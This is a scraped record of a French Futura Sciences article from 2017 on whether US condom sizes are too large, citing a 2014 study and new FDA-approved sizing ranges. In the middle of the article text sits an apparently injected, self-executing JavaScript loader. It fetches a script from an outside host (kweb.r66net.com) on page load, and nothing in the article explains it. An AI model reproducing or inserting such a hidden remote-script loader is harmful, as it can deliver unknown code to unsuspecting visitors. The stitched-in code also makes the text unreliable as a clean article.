{"title": "Preservatifs : faut-il en reduire la taille ?", "newspaper": "Futura Sciences", "author": ["Par la redaction de Futura"], "date_publi": "2017-10-19", "content": "Aux Etats-Unis, le monde du preservatif est en ebullition. De nouveaux modeles sont autorises a la vente. La nouveaute : une gamme de dimensions plus vaste, comme il en existe deja en Europe, avec, surtout, des tailles plus petites, qui sont mieux adaptees. L'exces de longueur semble etre une raison de la desaffection de cette protection outre-Atlantique. Aux Etats-Unis, enfin, on admet que les preservatifs sont trop grands. Les modeles homologues ont une longueur comprise entre 6,7 et 8,3 pouces (17 et 21 cm) pour une circonference de 3,9 a 4,5 pouces (9,9 a 11,4 cm). Mais une etude parue en 2014 dans la revue  Journal of sexual medicine  avait demontre l'exageration des mensurations masculines. Menee sur 1.661 hommes vivant aux Etats-Unis, elle concluait que la plupart avaient, en erection, un  penis  plus petit que ce standard, avec une moyenne a 14,2 cm pour la longueur et 12,2 cm pour la circonference. Anecdotique ? Pas sur. Selon des entretiens avec des specialistes publies dans le  New York Times , ces dimensions trop genereuses entament le confort, quand le  materiau  tire-bouchonne, et engendrent de desastreuses frustrations lorsque le modele plus petit se revele trop grand. Ce decalage expliquerait en partie pourquoi seulement un tiers des Americains utilisent le  preservatif .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Vers des preservatifs plus diversifies ? C'est pourquoi la  FDA  ( Food and Drug administration , faiseuse de normes en  matiere  d'alimentation et de sante), ainsi que l'ASTM et l' ISO  (deux organismes certificateurs) sont pressees d'evoluer sur la question. Il s'agit d'accepter de nouvelles  tailles  mais aussi de nouvelles methodes de verification de la qualite de l'objet conduisant a la  certification , ce qui permettrait, affirment les fabricants, d'elargir l'offre, et pas seulement en dimensions. Une entreprise pionniere profite de cette avancee, c'est Global Protection, qui produit une gamme baptisee MyOne Perfect Fit, proposant une tres large fourchette de longueurs et de circonferences. Il suffit de choisir, non pas des centimetres mais un code, genre  M17  ou Z22. Ses preservatifs sont disponibles en Europe depuis 2011, sous la marque TheyFit, car la reglementation y est differente. La gamme initiale proposait 95 dimensions mais une recente refonte commerciale a reduit le nombre a 56, les  longueurs  de 77 a 113 mm disparaissant. Aux Etats-Unis, le choix annonce est de 66. La protection y gagnera-t-elle ? ", "theme": "sante"}